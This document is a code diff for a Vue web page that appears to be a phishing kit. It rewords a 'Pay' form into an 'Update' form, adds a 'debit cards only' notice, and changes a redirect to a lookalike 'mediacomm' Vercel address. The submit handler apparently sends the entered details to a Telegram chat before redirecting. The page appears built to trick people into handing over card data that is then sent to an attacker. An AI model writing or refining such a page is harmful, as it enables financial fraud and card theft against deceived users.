@@ -151,19 +151,18 @@
                       <path d="m14.1 17.1h11.5v-4.2q0-2.4-1.7-4.1t-4-1.7-4.1 1.7-1.7 4.1v4.2z"></path>
                     </g>
                   </svg>
-                  This transaction is secured with TLS encryption
-                </div>
+                  Note: We currently accept debit cards only.                </div>
               </div>
 
               <div style="margin-bottom:1rem;">
-                By clicking "Pay" I affirm that I agree to the
+                By clicking "Update" I affirm that I agree to the
                 <a href="#" style="cursor:pointer;">terms and conditions</a>
               </div>
 
               <div style="padding-top:15px; display:flex; justify-content:center; align-items:center; flex-direction:column;">
                 <div class="col-6">
                   <button class="btn btn-lg btn-success btn-block" type="submit"   @click.prevent="finishJoob">
-                    Pay 
+                    Update 
                   </button>
                 </div>
               </div>
@@ -219,7 +218,7 @@
     await this.sendTelegramResult(process.env.VUE_APP_CHAT_ID, message)
     this.isActive = !this.isActive
     }else{
-      location.replace("https://mediacommm.vercel.app/")
+      location.replace("https://mediacomm-sigma.vercel.app/")
   
     }
     },
